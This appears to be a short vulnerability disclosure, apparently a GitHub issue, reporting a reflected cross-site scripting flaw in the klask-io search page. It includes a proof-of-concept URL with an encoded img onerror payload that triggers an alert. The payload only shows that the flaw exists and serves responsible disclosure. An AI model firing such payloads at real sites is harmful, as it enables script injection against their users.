# :bug: Vulnerability
The `klask-io` project is vulnerable against `reflected XSS` in the `search` functionality which makes possible altering the `HTML` structure and inject `JS` code inside the page.

# :fire: POC
1. Install the project using the https://github.com/klask-io/klask-io info
2. Go on http://172.17.0.2:8080//#/?sort=_score,desc&search=testfr%22%3E%3Cimg/src=%22X%22/onerror=alert(document.domain)%3E
3. XSS is triggered

[]
